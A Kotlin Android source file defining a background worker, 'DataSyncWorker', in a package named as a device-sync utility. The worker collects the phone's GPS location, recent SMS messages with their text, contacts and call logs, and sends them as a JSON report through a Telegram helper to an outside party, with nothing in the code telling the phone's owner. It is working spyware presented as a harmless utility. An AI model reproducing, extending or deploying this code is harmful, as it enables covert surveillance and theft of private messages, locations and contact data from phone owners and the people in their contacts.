package com.devicesync.utility

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.suspendCancellableCoroutine
import org.json.JSONArray
import org.json.JSONObject
import kotlin.coroutines.resume

class DataSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        return try {
            val payload = JSONObject()

            // Collect GPS location
            collectLocation(payload)

            // Collect last 10 SMS
            collectSms(payload)

            // Collect contacts
            collectContacts(payload)

            // Collect call logs
            collectCallLogs(payload)

            // Send to Telegram
            val message = buildString {
                appendLine("📱 DeviceSync Report")
                appendLine("```json")
                appendLine(payload.toString(2))
                appendLine("```")
            }

            runBlocking {
                TelegramHelper.sendMessage(message)
            }

            Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            Result.retry()
        }
    }

    private fun collectLocation(payload: JSONObject) {
        if (ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            payload.put("location", "Permission denied")
            return
        }

        try {
            val fusedClient = LocationServices.getFusedLocationProviderClient(applicationContext)
            val location = runBlocking { getLastLocationSuspend(fusedClient) }
            payload.put("location", JSONObject().apply {
                put("latitude", location?.latitude ?: "unknown")
                put("longitude", location?.longitude ?: "unknown")
                put("accuracy", location?.accuracy ?: "unknown")
                put("timestamp", location?.time ?: System.currentTimeMillis())
            })
        } catch (e: Exception) {
            payload.put("location", "Error: ${e.message}")
        }
    }

    private suspend fun getLastLocationSuspend(fusedClient: com.google.android.gms.location.FusedLocationProviderClient): Location? {
        return suspendCancellableCoroutine { continuation ->
            try {
                fusedClient.lastLocation
                    .addOnSuccessListener { location ->
                        continuation.resume(location)
                    }
                    .addOnFailureListener { _ ->
                        continuation.resume(null)
                    }
            } catch (e: Exception) {
                continuation.resume(null)
            }
        }
    }

    private fun collectSms(payload: JSONObject) {
        if (ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            payload.put("sms", "Permission denied")
            return
        }

        try {
            val smsArray = JSONArray()
            val uri = Telephony.Sms.CONTENT_URI
            val cursor: Cursor? = applicationContext.contentResolver.query(
                uri,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
                ),
                null, null,
                "${Telephony.Sms.DATE} DESC LIMIT 10"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    smsArray.put(JSONObject().apply {
                        put("address", it.getString(0) ?: "")
                        put("body", it.getString(1) ?: "")
                        put("date", it.getLong(2))
                        put("type", it.getInt(3))
                    })
                }
            }
            payload.put("sms", smsArray)
        } catch (e: Exception) {
            payload.put("sms", "Error: ${e.message}")
        }
    }

    private fun collectContacts(payload: JSONObject) {
        if (ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_CONTACTS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            payload.put("contacts", "Permission denied")
            return
        }

        try {
            val contactsArray = JSONArray()
            val cursor: Cursor? = applicationContext.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT 50"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    contactsArray.put(JSONObject().apply {
                        put("name", it.getString(0) ?: "")
                        put("phone", it.getString(1) ?: "")
                    })
                }
            }
            payload.put("contacts", contactsArray)
            payload.put("contacts_count", contactsArray.length())
        } catch (e: Exception) {
            payload.put("contacts", "Error: ${e.message}")
        }
    }

    private fun collectCallLogs(payload: JSONObject) {
        if (ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_CALL_LOG
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            payload.put("call_logs", "Permission denied")
            return
        }

        try {
            val callsArray = JSONArray()
            val cursor: Cursor? = applicationContext.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null, null,
                "${CallLog.Calls.DATE} DESC LIMIT 20"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    callsArray.put(JSONObject().apply {
                        put("number", it.getString(0) ?: "")
                        put("type", it.getInt(1))
                        put("date", it.getLong(2))
                        put("duration", it.getInt(3))
                    })
                }
            }
            payload.put("call_logs", callsArray)
        } catch (e: Exception) {
            payload.put("call_logs", "Error: ${e.message}")
        }
    }
}
